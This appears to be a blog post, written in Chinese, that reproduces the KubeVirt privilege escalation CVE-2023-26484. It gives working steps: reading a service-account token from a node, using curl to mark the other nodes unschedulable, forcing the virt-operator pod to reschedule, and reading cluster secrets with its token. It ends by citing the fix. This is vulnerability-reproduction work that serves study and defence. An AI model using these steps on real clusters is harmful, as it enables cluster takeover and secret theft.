<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CVE-2023-26484 Kubevirt 权限提升漏洞复现 | ch3n9w の 超元域</title>
<meta name="keywords" content="">
<meta name="description" content="该漏洞是论文工作 &ldquo;Take Over the Whole Cluster: Attacking Kubernetes via Excessive Permissions of Third-party Applications&rdquo; 挖掘到的, 对其进行复现可以更好地理解rbac的潜在风险.">
<meta name="author" content="">
<link rel="canonical" href="https://ch3n9w.github.io/posts/sec-cve-2023-26484/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://ch3n9w.github.io/flash.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://ch3n9w.github.io/flash.ico">
<link rel="icon" type="image/png" sizes="32x32" href="https://ch3n9w.github.io/flash.ico">
<link rel="apple-touch-icon" href="https://ch3n9w.github.io/flash.ico">
<link rel="mask-icon" href="https://ch3n9w.github.io/flash.ico">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://ch3n9w.github.io/posts/sec-cve-2023-26484/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
  

<meta property="og:title" content="CVE-2023-26484 Kubevirt 权限提升漏洞复现" />
<meta property="og:description" content="该漏洞是论文工作 &ldquo;Take Over the Whole Cluster: Attacking Kubernetes via Excessive Permissions of Third-party Applications&rdquo; 挖掘到的, 对其进行复现可以更好地理解rbac的潜在风险." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ch3n9w.github.io/posts/sec-cve-2023-26484/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-04-30T20:29:05+08:00" />
<meta property="article:modified_time" content="2024-04-30T20:29:05+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2023-26484 Kubevirt 权限提升漏洞复现"/>
<meta name="twitter:description" content="该漏洞是论文工作 &ldquo;Take Over the Whole Cluster: Attacking Kubernetes via Excessive Permissions of Third-party Applications&rdquo; 挖掘到的, 对其进行复现可以更好地理解rbac的潜在风险."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://ch3n9w.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CVE-2023-26484 Kubevirt 权限提升漏洞复现",
      "item": "https://ch3n9w.github.io/posts/sec-cve-2023-26484/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CVE-2023-26484 Kubevirt 权限提升漏洞复现",
  "name": "CVE-2023-26484 Kubevirt 权限提升漏洞复现",
  "description": "该漏洞是论文工作 \u0026ldquo;Take Over the Whole Cluster: Attacking Kubernetes via Excessive Permissions of Third-party Applications\u0026rdquo; 挖掘到的, 对其进行复现可以更好地理解rbac的潜在风险.\n",
  "keywords": [
    
  ],
  "articleBody": "该漏洞是论文工作 “Take Over the Whole Cluster: Attacking Kubernetes via Excessive Permissions of Third-party Applications” 挖掘到的, 对其进行复现可以更好地理解rbac的潜在风险.\nCVE-2023-26484 Kubevirt 权限提升漏洞 简介 KubeVirt 是 Kubernetes 的虚拟机管理插件. 在 0.59.0 及之前的版本中, 如果恶意用户接管了运行 virt-handler 的 Kubernetes 节点, 则 virt-handler 服务账户可用于修改所有节点.这可被滥用于诱骗系统级特权组件. 这样, 被入侵的节点就可以被用来提升节点之外的权限, 直到可能拥有对整个集群的完全权限访问. 一旦用户可以入侵特定节点, 最简单的利用方法就是使用 virt-handler 服务账户将所有其他节点设置为不可调度, 然后等待具有高权限的系统关键组件出现在其节点上.\n环境搭建 参考kubevirt的官网安装\nexport VERSION=\"v0.59.0\" kubectl create -f https://github.com/kubevirt/kubevirt/releases/download/${VERSION}/kubevirt-operator.yaml kubectl create -f https://github.com/kubevirt/kubevirt/releases/download/${VERSION}/kubevirt-cr.yaml 复现 从简介中就可以对这个漏洞的作用机理有一个大概的了解, 那么复现的步骤大致分为以下步骤:\n获取一个节点的权限, 上面有virt-handler, 由于virt-handler是Daemonsets资源, 因此一定存在 拿到virt-handler的SA Token, 然后向API Server发送请求去 patch 其他节点, 让新创建的容器无法被调度到这些节点上 删除其他节点上的高权限pod, 在这个漏洞中, 我们可以利用virt-operator pod, 它的cluster role具有list 和 get secret的权限 等待高权限pod被重新创建到攻击者控制的节点上 使用高权限pod的SA, 获取集群权限 为了复现完整的流程, 最开始的时候让virt-operator不要出现在自己的节点上. 由于我复现用的集群有三个节点, 而virt-operator的默认replicas是2, 因此修改kubevirt-operator.yaml中的相应选项并apply, 最后得到\nNAME READY STATUS RESTARTS AGE virt-api-695695c8bf-9jsjk 1/1 Running 1 (129m ago) 23d virt-api-695695c8bf-fljvr 1/1 Running 1 (129m ago) 23d virt-controller-6b8dbbd8c5-q7vf8 1/1 Running 1 (129m ago) 23d virt-controller-6b8dbbd8c5-x8jcb 1/1 Running 1 (129m ago) 23d virt-handler-j4qkf 1/1 Running 1 (129m ago) 23d virt-handler-ncpwp 1/1 Running 1 (129m ago) 23d virt-operator-5d5bdf9c5b-lzsmr 1/1 Running 2 (129m ago) 23d 接下来, 登录没有virt-operator的节点来模拟攻击者控制该节点的场景. 我的集群使用containerd作为容器引擎, 查看节点上的容器\n❯ ctr -n k8s.io c ls CONTAINER IMAGE RUNTIME 018b6f216241def706bf49b2cbe0136d26a9440ec44fba5ff9158f9c64449f77 registry.k8s.io/pause:3.6 io.containerd.runc.v2 03bc2c88f4e7f0b748cbff9e74469886125ec7857385750dd6962547fc2c94dd registry.k8s.io/pause:3.6 io.containerd.runc.v2 2e34f1411a95334edbb18df3bfd6dd860c8369d19eb41efef66fd4aa75664ef7 registry.k8s.io/pause:3.6 io.containerd.runc.v2 3cad963e8764d3b57754dc8723e2dce8e7793c388b9a74083fd54ced88595ae3 docker.io/flannel/flannel:v0.24.3 io.containerd.runc.v2 3df18a38c2398324f3836bb0fbe99f55775f641559fde6a9f57247d9d13be913 quay.io/kubevirt/virt-api:v0.59.0 io.containerd.runc.v2 45a7feb9dabff6a8200ccf37f6da7c01d7f689b866127921f1b1c37d825fdeda quay.io/kubevirt/virt-handler:v0.59.0 io.containerd.runc.v2 4db25b7315ee957434ce455fd8de25c499e83ad521cb53f125fa436e5b50ad22 quay.io/kubevirt/virt-api:v0.59.0 io.containerd.runc.v2 5c26a0f3b233eadb1f46382def64ee0401b8cc19c1dda80f60ad131b1e3f821d registry.k8s.io/kube-proxy:v1.25.16 io.containerd.runc.v2 688a35b84fc0ce7bd68e02928eb4e22728559e41977a4d2a5e108f6865c5f3c6 quay.io/kubevirt/virt-controller:v0.59.0 io.containerd.runc.v2 6e6eab0c1ede3d083283f8d96758bc898a81ceb472349e04a38c3bf6042c3bfb quay.io/kubevirt/virt-controller:v0.59.0 io.containerd.runc.v2 836f05ead0f47d570373917f2315111a85104c36e2e2f700aa5949dac1963ec6 registry.k8s.io/pause:3.6 io.containerd.runc.v2 8f26e2c39123230330328ab931a517d334c83d92dad0b637c6522217cf7d9482 registry.k8s.io/pause:3.6 io.containerd.runc.v2 8f4c6b146eeea6b6f994f2deb5adc6d938ec79afb00cb71e7491b8b6e98359f6 registry.k8s.io/pause:3.6 io.containerd.runc.v2 90cc829dd1102778df74b9616dcef5061476d4a2b04660ee9ba23f34fbfdbaab quay.io/kubevirt/virt-launcher:v0.59.0 io.containerd.runc.v2 a4b93524451f68c41efa103e432622113c4909979c5d7ac538eede7455b6bfaa registry.k8s.io/kube-proxy:v1.25.16 io.containerd.runc.v2 b23ac35d5a9639ec75a923af74b9f6ed571c89a9a59ad037424fb829a39a73f1 docker.io/flannel/flannel-cni-plugin:v1.4.0-flannel1 io.containerd.runc.v2 bc71642c1b0228d2ed22e92c817d1eed581ef6179e25da5ba14b69df43251166 docker.io/flannel/flannel:v0.24.3 io.containerd.runc.v2 c47082251d14b8e743d41ace290bd64923b704afb9e4e9193d7ad2e6b120f176 quay.io/kubevirt/virt-handler:v0.59.0 io.containerd.runc.v2 c64079c284e3ce04c261ef192bb1a29a341f0e359dd8c0f0f5678748beaac846 registry.k8s.io/pause:3.6 io.containerd.runc.v2 ce128301b8f46a6e68711355780ff22389507e62b19ae987cbe6fdbda7fbdc58 registry.k8s.io/pause:3.6 io.containerd.runc.v2 d80cb0fc9991d5a0ba8bf565cd1ddc94273cfb50c2b56fb883f455193a1cab00 registry.k8s.io/pause:3.6 io.containerd.runc.v2 e253d834e57f7ee5ae3116e5e922aac2efda2e4475bf79de044b71666191f0c2 registry.k8s.io/pause:3.6 io.containerd.runc.v2 e983fef8d9a9556f82c81008e8efbfcd432781c48c078db6d36ef72650d0f6e4 docker.io/flannel/flannel:v0.24.3 io.containerd.runc.v2 然后要找virt-handler的sa token, 在这次复现中, sa token的位置在/var/lib/kubelet/pods/3b42aafd-8696-4077-a903-6f575e7c4784/volumes/kubernetes.io~projected/kube-api-access-dc92g 下面, 然后使用这个token对其他节点进行patch\ncurl -k -X PATCH -H \"Authorization: Bearer \" \\ -H \"Content-Type: application/json-patch+json\" \\ -d '[{\"op\": \"replace\", \"path\": \"/spec/unschedulable\", \"value\": true}]' \\ \"https:///api/v1/nodes/\" 然后手动删除virt-operator\nkubectl delete po virt-operator-5d5bdf9c5b-lzsmr 稍等片刻就可以看到virt-operator重新出现在了我们控制的节点上, 使用命令来查看sa token的具体位置\nctr -n k8s.io c ls ctr -n k8s.io c info 然后用这个token去查看secrets, 以kubevirt中的secrets为例, 发送请求即可读取.\ncurl -k -H \"Authorization: Bearer \" https://192.168.59.101:6443/api/v1/namespaces/kubevirt/secrets 修复 限制了operator对secret的访问范围, 修复的commit\n",
  "wordCount" : "284",
  "inLanguage": "en",
  "datePublished": "2024-04-30T20:29:05+08:00",
  "dateModified": "2024-04-30T20:29:05+08:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://ch3n9w.github.io/posts/sec-cve-2023-26484/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "ch3n9w の 超元域",
    "logo": {
      "@type": "ImageObject",
      "url": "https://ch3n9w.github.io/flash.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://ch3n9w.github.io/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
                <img src="https://ch3n9w.github.io/sabito.jpg" alt="" aria-label="logo"
                    height="35">ch3n9w の 超元域</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://ch3n9w.github.io/categories/" title="categories">
                    <span>categories</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://ch3n9w.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://ch3n9w.github.io/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      CVE-2023-26484 Kubevirt 权限提升漏洞复现
    </h1>
    <div class="post-meta"><span title='2024-04-30 20:29:05 +0800 CST'>April 30, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;284 words

</div>
  </header> <div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#简介">简介</a></li>
    <li><a href="#环境搭建">环境搭建</a></li>
    <li><a href="#复现">复现</a></li>
    <li><a href="#修复">修复</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><p>该漏洞是论文工作 &ldquo;Take Over the Whole Cluster: Attacking Kubernetes via Excessive Permissions of Third-party Applications&rdquo; 挖掘到的, 对其进行复现可以更好地理解rbac的潜在风险.</p>
<h1 id="cve-2023-26484-kubevirt-权限提升漏洞">CVE-2023-26484 Kubevirt 权限提升漏洞<a hidden class="anchor" aria-hidden="true" href="#cve-2023-26484-kubevirt-权限提升漏洞">#</a></h1>
<h2 id="简介">简介<a hidden class="anchor" aria-hidden="true" href="#简介">#</a></h2>
<p>KubeVirt 是 Kubernetes 的虚拟机管理插件. 在 0.59.0 及之前的版本中, 如果恶意用户接管了运行 virt-handler 的 Kubernetes 节点, 则 virt-handler 服务账户可用于修改所有节点.这可被滥用于诱骗系统级特权组件. 这样, 被入侵的节点就可以被用来提升节点之外的权限, 直到可能拥有对整个集群的完全权限访问. 一旦用户可以入侵特定节点, 最简单的利用方法就是使用 virt-handler 服务账户将所有其他节点设置为不可调度, 然后等待具有高权限的系统关键组件出现在其节点上.</p>
<h2 id="环境搭建">环境搭建<a hidden class="anchor" aria-hidden="true" href="#环境搭建">#</a></h2>
<p>参考kubevirt的官网安装</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>export VERSION<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;v0.59.0&#34;</span>
</span></span><span style="display:flex;"><span>kubectl create -f https://github.com/kubevirt/kubevirt/releases/download/<span style="color:#e6db74">${</span>VERSION<span style="color:#e6db74">}</span>/kubevirt-operator.yaml
</span></span><span style="display:flex;"><span>kubectl create -f https://github.com/kubevirt/kubevirt/releases/download/<span style="color:#e6db74">${</span>VERSION<span style="color:#e6db74">}</span>/kubevirt-cr.yaml
</span></span></code></pre></div><h2 id="复现">复现<a hidden class="anchor" aria-hidden="true" href="#复现">#</a></h2>
<p>从简介中就可以对这个漏洞的作用机理有一个大概的了解, 那么复现的步骤大致分为以下步骤:</p>
<ol>
<li>获取一个节点的权限, 上面有virt-handler, 由于virt-handler是Daemonsets资源, 因此一定存在</li>
<li>拿到virt-handler的SA Token, 然后向API Server发送请求去 patch 其他节点, 让新创建的容器无法被调度到这些节点上</li>
<li>删除其他节点上的高权限pod, 在这个漏洞中, 我们可以利用virt-operator pod, 它的cluster role具有list 和 get secret的权限</li>
<li>等待高权限pod被重新创建到攻击者控制的节点上</li>
<li>使用高权限pod的SA, 获取集群权限</li>
</ol>
<p>为了复现完整的流程, 最开始的时候让virt-operator不要出现在自己的节点上. 由于我复现用的集群有三个节点, 而virt-operator的默认replicas是2, 因此修改<code>kubevirt-operator.yaml</code>中的相应选项并apply, 最后得到</p>
<pre tabindex="0"><code>NAME                               READY   STATUS    RESTARTS       AGE
virt-api-695695c8bf-9jsjk          1/1     Running   1 (129m ago)   23d
virt-api-695695c8bf-fljvr          1/1     Running   1 (129m ago)   23d
virt-controller-6b8dbbd8c5-q7vf8   1/1     Running   1 (129m ago)   23d
virt-controller-6b8dbbd8c5-x8jcb   1/1     Running   1 (129m ago)   23d
virt-handler-j4qkf                 1/1     Running   1 (129m ago)   23d
virt-handler-ncpwp                 1/1     Running   1 (129m ago)   23d
virt-operator-5d5bdf9c5b-lzsmr     1/1     Running   2 (129m ago)   23d
</code></pre><p>接下来, 登录没有virt-operator的节点来模拟攻击者控制该节点的场景. 我的集群使用containerd作为容器引擎, 查看节点上的容器</p>
<pre tabindex="0"><code>❯ ctr -n k8s.io c ls
CONTAINER                                                           IMAGE                                                   RUNTIME
018b6f216241def706bf49b2cbe0136d26a9440ec44fba5ff9158f9c64449f77    registry.k8s.io/pause:3.6                               io.containerd.runc.v2
03bc2c88f4e7f0b748cbff9e74469886125ec7857385750dd6962547fc2c94dd    registry.k8s.io/pause:3.6                               io.containerd.runc.v2
2e34f1411a95334edbb18df3bfd6dd860c8369d19eb41efef66fd4aa75664ef7    registry.k8s.io/pause:3.6                               io.containerd.runc.v2
3cad963e8764d3b57754dc8723e2dce8e7793c388b9a74083fd54ced88595ae3    docker.io/flannel/flannel:v0.24.3                       io.containerd.runc.v2
3df18a38c2398324f3836bb0fbe99f55775f641559fde6a9f57247d9d13be913    quay.io/kubevirt/virt-api:v0.59.0                       io.containerd.runc.v2
45a7feb9dabff6a8200ccf37f6da7c01d7f689b866127921f1b1c37d825fdeda    quay.io/kubevirt/virt-handler:v0.59.0                   io.containerd.runc.v2
4db25b7315ee957434ce455fd8de25c499e83ad521cb53f125fa436e5b50ad22    quay.io/kubevirt/virt-api:v0.59.0                       io.containerd.runc.v2
5c26a0f3b233eadb1f46382def64ee0401b8cc19c1dda80f60ad131b1e3f821d    registry.k8s.io/kube-proxy:v1.25.16                     io.containerd.runc.v2
688a35b84fc0ce7bd68e02928eb4e22728559e41977a4d2a5e108f6865c5f3c6    quay.io/kubevirt/virt-controller:v0.59.0                io.containerd.runc.v2
6e6eab0c1ede3d083283f8d96758bc898a81ceb472349e04a38c3bf6042c3bfb    quay.io/kubevirt/virt-controller:v0.59.0                io.containerd.runc.v2
836f05ead0f47d570373917f2315111a85104c36e2e2f700aa5949dac1963ec6    registry.k8s.io/pause:3.6                               io.containerd.runc.v2
8f26e2c39123230330328ab931a517d334c83d92dad0b637c6522217cf7d9482    registry.k8s.io/pause:3.6                               io.containerd.runc.v2
8f4c6b146eeea6b6f994f2deb5adc6d938ec79afb00cb71e7491b8b6e98359f6    registry.k8s.io/pause:3.6                               io.containerd.runc.v2
90cc829dd1102778df74b9616dcef5061476d4a2b04660ee9ba23f34fbfdbaab    quay.io/kubevirt/virt-launcher:v0.59.0                  io.containerd.runc.v2
a4b93524451f68c41efa103e432622113c4909979c5d7ac538eede7455b6bfaa    registry.k8s.io/kube-proxy:v1.25.16                     io.containerd.runc.v2
b23ac35d5a9639ec75a923af74b9f6ed571c89a9a59ad037424fb829a39a73f1    docker.io/flannel/flannel-cni-plugin:v1.4.0-flannel1    io.containerd.runc.v2
bc71642c1b0228d2ed22e92c817d1eed581ef6179e25da5ba14b69df43251166    docker.io/flannel/flannel:v0.24.3                       io.containerd.runc.v2
c47082251d14b8e743d41ace290bd64923b704afb9e4e9193d7ad2e6b120f176    quay.io/kubevirt/virt-handler:v0.59.0                   io.containerd.runc.v2
c64079c284e3ce04c261ef192bb1a29a341f0e359dd8c0f0f5678748beaac846    registry.k8s.io/pause:3.6                               io.containerd.runc.v2
ce128301b8f46a6e68711355780ff22389507e62b19ae987cbe6fdbda7fbdc58    registry.k8s.io/pause:3.6                               io.containerd.runc.v2
d80cb0fc9991d5a0ba8bf565cd1ddc94273cfb50c2b56fb883f455193a1cab00    registry.k8s.io/pause:3.6                               io.containerd.runc.v2
e253d834e57f7ee5ae3116e5e922aac2efda2e4475bf79de044b71666191f0c2    registry.k8s.io/pause:3.6                               io.containerd.runc.v2
e983fef8d9a9556f82c81008e8efbfcd432781c48c078db6d36ef72650d0f6e4    docker.io/flannel/flannel:v0.24.3                       io.containerd.runc.v2
</code></pre><p>然后要找virt-handler的sa token, 在这次复现中, sa token的位置在<code>/var/lib/kubelet/pods/3b42aafd-8696-4077-a903-6f575e7c4784/volumes/kubernetes.io~projected/kube-api-access-dc92g</code> 下面, 然后使用这个token对其他节点进行patch</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -k -X PATCH -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;sa-token&gt;&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>     -H <span style="color:#e6db74">&#34;Content-Type: application/json-patch+json&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>     -d <span style="color:#e6db74">&#39;[{&#34;op&#34;: &#34;replace&#34;, &#34;path&#34;: &#34;/spec/unschedulable&#34;, &#34;value&#34;: true}]&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>     <span style="color:#e6db74">&#34;https://&lt;api-server-address&gt;/api/v1/nodes/&lt;node&gt;&#34;</span>
</span></span></code></pre></div><p>然后手动删除<code>virt-operator</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl delete po virt-operator-5d5bdf9c5b-lzsmr
</span></span></code></pre></div><p>稍等片刻就可以看到<code>virt-operator</code>重新出现在了我们控制的节点上, 使用命令来查看sa token的具体位置</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ctr -n k8s.io c ls
</span></span><span style="display:flex;"><span>ctr -n k8s.io c info &lt;container-id&gt;
</span></span></code></pre></div><p>然后用这个token去查看secrets, 以kubevirt中的secrets为例, 发送请求即可读取.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -k -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;sa-token&gt;&#34;</span> https://192.168.59.101:6443/api/v1/namespaces/kubevirt/secrets
</span></span></code></pre></div><h2 id="修复">修复<a hidden class="anchor" aria-hidden="true" href="#修复">#</a></h2>
<p>限制了operator对secret的访问范围, <a href="https://github.com/kubevirt/kubevirt/pull/9162/commits/d43ab4ea6b74ae0c3f2e607da111d376bf58240c">修复的commit</a></p>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://ch3n9w.github.io/posts/tech-kubernetes-webhook/">
    <span class="title">« Prev</span>
    <br>
    <span>Kubernetes Admission Webhook 部署和调试</span>
  </a>
  <a class="next" href="https://ch3n9w.github.io/posts/read-free-opensource/">
    <span class="title">Next »</span>
    <br>
    <span>若为自由故, 软件皆可抛</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="https://ch3n9w.github.io/">ch3n9w の 超元域</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
